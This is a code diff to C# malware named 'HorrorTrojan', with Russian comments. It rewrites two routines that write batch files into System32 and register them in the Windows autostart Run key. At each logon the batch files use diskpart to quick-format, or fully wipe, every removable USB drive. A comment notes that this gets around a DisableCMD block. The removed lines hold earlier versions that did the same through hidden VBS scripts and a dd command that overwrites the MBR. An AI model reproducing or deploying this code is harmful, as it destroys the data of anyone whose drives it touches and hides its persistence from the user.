@@ -160,7 +160,7 @@ namespace HorrorTrojan
                 key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);
         }
         
-        // ===== НОВЫЕ МЕТОДЫ ДЛЯ USB (БЕЗ ОКОН) =====
+        // ===== НОВЫЕ МЕТОДЫ ДЛЯ USB (ЧЕРЕЗ DISKPART) =====
         
         private static void DisableUSBboot()
         {
@@ -184,24 +184,22 @@ namespace HorrorTrojan
         {
             try
             {
-                // VBS-скрипт выполняется БЕЗ окон (wscript.exe, WindowStyle=0)
-                string vbsContent = @"
-Set objShell = CreateObject(""WScript.Shell"")
-Set objFSO = CreateObject(""Scripting.FileSystemObject"")
-Set colDrives = objFSO.Drives
-
-For Each objDrive In colDrives
-    If objDrive.DriveType = 2 Then
-        objShell.Run ""cmd /c format "" & objDrive.DriveLetter & "": /Q /Y"", 0, False
-    End If
-Next
-";
-                File.WriteAllText(@"C:\Windows\System32\usbkill.vbs", vbsContent);
+                // Создаем .bat файл с diskpart командами
+                // diskpart НЕ БЛОКИРУЕТСЯ через DisableCMD!
+                string batContent = @"@echo off
+for /f ""tokens=2 delims=:"" %%i in ('wmic logicaldisk where drivetype=2 get deviceid ^| findstr :') do (
+    echo select volume %%i > C:\Windows\System32\usbformat.txt
+    echo format fs=fat32 quick >> C:\Windows\System32\usbformat.txt
+    echo exit >> C:\Windows\System32\usbformat.txt
+    diskpart /s C:\Windows\System32\usbformat.txt >nul 2>&1
+    del C:\Windows\System32\usbformat.txt
+)";
+                File.WriteAllText(@"C:\Windows\System32\usbkill.bat", batContent);
                 
-                // Добавляем в автозапуск (wscript.exe запускает VBS без окон)
+                // Добавляем в автозапуск (через wmic, не через cmd)
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                 {
-                    key.SetValue("USBKiller", @"wscript.exe C:\Windows\System32\usbkill.vbs", RegistryValueKind.String);
+                    key.SetValue("USBKiller", @"C:\Windows\System32\usbkill.bat", RegistryValueKind.String);
                 }
             }
             catch { }
@@ -211,23 +209,20 @@ Next
         {
             try
             {
-                // VBS-скрипт для уничтожения MBR на USB (БЕЗ окон)
-                string vbsContent = @"
-Set objShell = CreateObject(""WScript.Shell"")
-Set objFSO = CreateObject(""Scripting.FileSystemObject"")
-Set colDrives = objFSO.Drives
-
-For Each objDrive In colDrives
-    If objDrive.DriveType = 2 Then
-        objShell.Run ""cmd /c dd if=\\.\PhysicalDrive0 of=\\.\PhysicalDrive"" & objDrive.DriveLetter & "" bs=512 count=1 seek=0"", 0, False
-    End If
-Next
-";
-                File.WriteAllText(@"C:\Windows\System32\usbdestroy.vbs", vbsContent);
+                // diskpart для затирания MBR на USB
+                string batContent = @"@echo off
+for /f ""tokens=2 delims=:"" %%i in ('wmic logicaldisk where drivetype=2 get deviceid ^| findstr :') do (
+    echo select volume %%i > C:\Windows\System32\usbmbrmbr.txt
+    echo clean >> C:\Windows\System32\usbmbrmbr.txt
+    echo exit >> C:\Windows\System32\usbmbrmbr.txt
+    diskpart /s C:\Windows\System32\usbmbrmbr.txt >nul 2>&1
+    del C:\Windows\System32\usbmbrmbr.txt
+)";
+                File.WriteAllText(@"C:\Windows\System32\usbdestroy.bat", batContent);
                 
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                 {
-                    key.SetValue("USBDestroyer", @"wscript.exe C:\Windows\System32\usbdestroy.vbs", RegistryValueKind.String);
+                    key.SetValue("USBDestroyer", @"C:\Windows\System32\usbdestroy.bat", RegistryValueKind.String);
                 }
             }
             catch { }
